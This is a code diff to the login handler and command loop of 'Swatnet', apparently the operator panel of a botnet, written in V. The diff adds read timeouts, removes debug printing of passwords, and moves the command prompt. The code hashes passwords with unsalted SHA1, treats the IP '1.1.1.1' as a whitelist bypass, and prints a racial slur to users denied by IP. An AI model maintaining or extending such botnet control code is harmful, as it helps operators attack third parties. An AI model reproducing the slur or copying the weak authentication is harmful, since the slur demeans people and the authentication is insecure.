@@ -91,17 +91,18 @@ pub fn (mut s Swatnet) auth(mut client net.TcpConn) {
 	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
 
 	client.write_string("Username: ") or { 0 }
+	client.set_read_timeout(5*time.second) // Set a TIMEOUT
 	username := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
 	client.write_string("Password: ") or { 0 }
+	client.set_read_timeout(5*time.second) // Set a TIMEOUT
 	password := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
 
 	user_info := crud.find(username)
-	println(user_info)
-	println(password)
-	println((sha1.sum(password.bytes()).hex()).str())
+	
 	if user_info.username == username && user_info.password == (sha1.sum(password.bytes()).hex()).str() {
 		if user_info.ip == user_ip || user_info.ip == "1.1.1.1" {
 			client.write_string("[ + ] Access Granted\r\nWelcome: ${username}\r\n") or { 0 }
+			client.set_read_timeout(time.infinite)
 		} else {
 			client.write_string("[ x ] Access Denied (IP)\r\nDuces Nigga....") or { 0 }
 			time.sleep(5*time.second)
@@ -121,6 +122,7 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 	mut reader := io.new_buffered_reader(reader: client)
 	client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
 	for {
+		client.write_string("Swatnet@NET~ # ") or { 0 }
 		data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
 		fcmd, cmd, args := s.bot.parse_buffer(data)
 		if data.len > 2 {
@@ -179,7 +181,6 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 				}
 			}
 			logger.console_log("new_user_cmd", fcmd, false)
-			client.write_string("Swatnet@NET~ # ") or { 0 }
 		}
 	}
 }
